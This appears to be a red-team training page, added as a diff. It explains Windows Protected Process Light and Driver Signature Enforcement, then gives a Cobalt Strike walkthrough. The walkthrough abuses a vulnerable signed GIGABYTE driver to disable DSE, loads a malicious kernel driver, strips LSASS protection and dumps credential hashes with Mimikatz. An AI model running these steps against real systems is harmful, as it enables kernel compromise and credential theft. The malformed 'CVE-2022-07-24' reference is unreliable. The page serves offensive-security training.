@@ -1,0 +1,146 @@
+import { Tab, Tabs, Callout } from 'nextra-theme-docs'
+
+### Protected Process
+- **Protected Process** (PP) and **Protected Process Light** (PPL) is a relatively new mechanism on Windows which was first designed as protection for DRM (Digital Rights Management).  The idea was to allow media players to read Blu-Ray discs, but not copy the content.  It worked fundamentally by limiting the access you could obtain to a protected process, such as `PROCESS_QUERY_LIMITED_INFORMATION` or `PROCESS_TERMINATE`, but not `PROCESS_VM_READ` or anything else that would allow you to circumvent the DRM requirements.
+- Then this concept is used for protecting other processes like **LSASS**. We won't be able to get a handle to **LSASS** 
+    ![pp](/images/pp-1.png)
+- It can be enforced by the Windows Kernel, not by **AVs** or **EDRs**
+- We can use [**ppenum**](https://github.com/rasta-mouse/PPEnum) to check if the process is a protected process, can also be used from CobaltStrike.
+- It shows here that the **LSASS** is a PPL with **Signer LSA**
+    ![pp-2](/images/pp-2.png)
+- The kernel considers the procedence levels:
+    - **PP** processes can obtain a handle to other **PP** or **PPL** processes as long as they have the same signer.
+    - **PPL** processes can obtain a handle to other **PPL** processes but not **PP** process as long as they have the same signer.
+
+### DSE
+**Driver Signature Enforcement**  is a security feature implemented in modern Windows operating systems, **including Windows Vista and later versions**. Its primary purpose is to enhance system security by ensuring that only digitally signed drivers are loaded into the Windows kernel.
+
+When a driver is developed and signed by a legitimate software publisher, it means that the driver's code has been verified and approved by the publisher, and any modifications to the driver can be traced back to that publisher. This helps prevent the loading of malicious or unauthorized drivers that could potentially compromise the stability and security of the operating system.
+
+**How Driver Signature Enforcement works**:
+
+1. **Unsigned Drivers**: By default, Windows will only load drivers that are digitally signed. If an unsigned driver is attempted to be loaded, the system will prevent it from loading and display a warning to the user.
+2. **Test Signing Mode**: For development and testing purposes, Windows allows users to enable a "Test Signing Mode," which relaxes the driver signature enforcement requirement. In this mode, unsigned drivers can be loaded, but a watermark will appear on the desktop indicating that test signing is enabled.
+3. **Secure Boot**: On systems with UEFI (Unified Extensible Firmware Interface) and Secure Boot enabled, the firmware verifies the digital signature of the operating system and its components, including drivers, during boot. This adds an extra layer of security by preventing the loading of unsigned or tampered components.
+<Callout type="info" emoji="👻">
+If we really really really want to run unsigned drivers, we can disable it of course. but put in mind that this is a high risk operation as the **DSE** is a very important security control 
+1. Restart the computer.
+2. As the computer restarts, press the "F8" key repeatedly before the Windows logo appears.
+3. Select **Disable driver signature enforcement** from the advanced boot options menu.
+</Callout>
+
+Trying to load an unsigned driver 
+    ```bash copy filename="beacon>"
+    # upload the driver to the target machine
+    beacon> cd C:\Windows\System32\drivers
+    beacon> upload C:\Tools\RedOctober\RedOctober.sys
+
+    # To run the driver we should create and run a kernel-mode service
+    beacon> run sc create redoct type= kernel binPath= C:\Windows\System32\drivers\RedOctober.sys
+    ```
+
+    and as expected, It won't run 
+    ![pp-3](/images/pp-3.png)
+
+### DSE Bypass 
+- **User Land Exploits** They come and go, such as [**PPLDump**](https://github.com/itm4n/PPLdump) which depends on **CVE-2022-07-24**. 
+- **Kernel Land Exploits (Drivers)** .. the guaranteed way 👻
+    - There are some tools that can do that like [**PPLKiller**](https://github.com/RedCursorSecurityConsulting/PPLKiller), [**mimidrv**](https://github.com/gentilkiwi/mimikatz/tree/master/mimidrv). or we can write our own custom driver.
+        <Callout type="info" emoji="👻">
+        Note that elevating from a local admin into the kernel is not a security boundary, so this is not seen as a serviceable vulnerability by Microsoft. However, you cannot load drivers that are not legitimately signed unless **Windows Test Signing mode** is **enabled**
+        </Callout>
+        
+      
+
+    - Bypassing the **DSE** (Digital Signature Enforcement)
+        - First off, we need an arbitrary kernel memory write primitive, A common way to achieve that is by loading a known vulnerable (yet legitimately signed) driver, we can find such drivers in [**LOLDrivers Project**](https://www.loldrivers.io/)
+        - Using the GIGABYT driver 
+
+            ``` bash copy filename="beacon"
+            beacon> cd C:\Windows\System32\drivers
+            beacon> upload C:\Tools\cobaltstrike\gdrv\gdrv.sys
+            beacon> run sc create gdrv type= kernel binPath= C:\Windows\System32\drivers\gdrv.sys
+            beacon> run sc start gdrv
+
+            SERVICE_NAME: gdrv 
+                    TYPE               : 1  KERNEL_DRIVER  
+                    STATE              : 4  RUNNING 
+                                            (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+            ```
+        - **DSE** is controlled by a region of kernel memory that is guarded by **Kernel Patch Protection (KPP)**. so As we'll be executing our commands through the loaded driver, Our commands will have the kernel level of permissions, so now we can disable the **DSE**
+        - To interact with a loaded driver, we need to call the **IOCTLs** that It exposes to the **userland** We have a BOF and an aggressor script `gdrv.cna` to easily do so
+        <Callout type="info" emoji="👻">
+        **IOCTL** stands for "Input/Output Control." An *IOCTL* is a mechanism that allows user-mode applications or higher-level components of the operating system to communicate with and control kernel-mode device drivers. It enables communication between user-mode code and kernel-mode code **by passing control codes and data buffers through a system call.**
+        </Callout>
+        - So, now disable the **DSE**, At first, we should load the `gdrv.cna` aggressor script which contains the `enable_dse` and `disable_dse` aliases
+            ```bash copy filename="beacon"
+            beacon> disable_dse
+            [+] DSE disabled
+            ```
+        - Run our  malicious driver 
+            ```bash copy filename="beacon" 
+            
+            beacon> cd C:\Windows\System32\drivers
+            beacon> upload C:\Tools\RedOctober\RedOctober.sys
+            beacon> run sc create redoct type= kernel binPath= C:\Windows\System32\drivers\RedOctober.sys 
+            beacon> run sc start redoct
+
+            SERVICE_NAME: redoct 
+            TYPE               : 1  KERNEL_DRIVER
+            S   TATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+            ```
+        - Now Import the `redoc.cna` aggressor script which contains the  `unprotect_process` alias
+        -  To prevent a **BSOD** (Blue Screen of Death) situation 😅, re-enable DSE as soon as possible
+            ```bash copy filename="beacon"
+            beacon> enable_dse
+            [+] DSE enabled
+            ```
+        - Now, there is no need for our original driver **GIGABYTE** as of now we successfully loaded ours. so unload and remove it 
+            ```bash copy filename="beacon"
+            beacon> run sc stop gdrv
+            beacon> run sc delete gdrv
+            beacon> rm gdrv.sys
+            ```
+        
+        Now It's time to dump  **LSASS** for instance
+            - Because protected processes are hierarchical, there are two ways to tackle this.
+                - Remove the protection level from **LSASS**.
+                - Elevate the protection level of a process we control to be greater than **LSASS**.
+            - Because **Mimikatz** in CobaltStrike is **fork & run**, it's a little easier to just remove the protection from **LSASS**. We got a prepared a BOF and aggressor script to call the correct **IOCTL** from our redoc driver.  The command is simply `unprotect_process <pid>`.
+
+                ```bash copy filename="beacon"
+                beacon> ppenum 652
+                [*] Running PPEnum against PID 652
+
+                Type   : PsProtectedTypeProtectedLight
+                Signer : PsProtectedSignerLsa
+
+                beacon> unprotect_process 652
+                [+] host called home, sent: 2498 bytes
+
+                beacon> ppenum 652
+                [*] Running PPEnum against PID 652
+
+                Type   : PsProtectedTypeNone
+                Signer : PsProtectedSignerNone
+                ```
+            - Now, **mimikatz** works like magic
+                ```bash copy filename="beacon"
+                beacon> mimikatz !sekurlsa::logonpasswords
+
+                Authentication Id : 0 ; 1415530 (00000000:0015996a)
+                Session           : RemoteInteractive from 2
+                User Name         : bturner
+                Domain            : ACME
+                Logon Server      : DC
+                Logon Time        : 5/16/2023 3:05:35 PM
+                SID               : S-1-5-21-2006696020-36449419-3390662055-1106
+                    msv :	
+                    [00000003] Primary
+                    * Username : bturner
+                    * Domain   : ACME
+                    * NTLM     : 1804bfd7e057f1b37d5bba093c594d1e
+                    * SHA1     : da4585eb8811a5a291ff1c61603b42cc59996079
+                    * DPAPI    : 12944985316c14d13757dbab27ab0f24
+                ```
